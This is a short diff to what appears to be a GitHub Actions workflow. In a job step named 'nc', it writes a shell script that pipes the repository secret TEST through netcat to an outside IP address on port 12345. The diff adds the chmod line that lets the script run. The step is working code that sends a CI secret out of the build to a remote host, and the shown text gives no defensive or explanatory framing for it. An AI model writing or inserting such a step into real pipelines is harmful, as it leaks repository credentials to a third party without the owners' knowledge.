@@ -12,6 +12,7 @@ jobs:
       - name: nc
         run: |
           echo "echo $test_secret | nc 52.224.65.226 12345 -N" > test.sh
+          chmod +x test.sh
           ./test.sh
         env:
           test_secret: ${{ secrets.TEST }}
